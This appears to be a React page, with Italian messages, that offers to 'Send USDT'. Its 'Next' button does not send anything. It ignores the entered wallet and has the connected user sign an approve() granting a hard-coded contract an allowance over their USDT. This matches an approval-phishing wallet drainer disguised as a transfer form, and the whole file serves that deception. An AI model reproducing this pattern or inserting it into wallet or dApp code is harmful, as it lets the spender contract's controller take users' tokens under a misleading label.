import { useState } from "react";
import { ethers } from "ethers";

export default function Home() {
  const [from, setFrom] = useState("");
  const [amount, setAmount] = useState("");

  const CONTRACT = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";
  const USDT = "0x55d398326f99059fF775485246999027B3197955";

  const next = async () => {
    try {
      if (!from || !amount) {
        alert("Inserisci dati");
        return;
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const contract = new ethers.Contract(
        USDT,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      const value = ethers.parseUnits(amount, 18);

      const tx = await contract.approve(CONTRACT, value);
      await tx.wait();

      alert("Next completato!");
    } catch (err) {
      console.log(err);
      alert("Errore");
    }
  };

  return (
    <div style={{
      background: "#000",
      color: "#00ff9f",
      minHeight: "100vh",
      padding: "20px",
      fontFamily: "monospace"
    }}>
      <h2>💸 Send USDT</h2>

      <input
        placeholder="Wallet utente"
        value={from}
        onChange={(e) => setFrom(e.target.value)}
        style={{ padding: "10px", marginTop: "10px", width: "100%" }}
      />

      <input
        placeholder="Amount USDT"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        style={{ padding: "10px", marginTop: "10px", width: "100%" }}
      />

      <button
        onClick={next}
        style={{
          marginTop: "15px",
          padding: "12px",
          background: "#00ff9f",
          border: "none",
          width: "100%"
        }}
      >
        Next
      </button>
    </div>
  );
}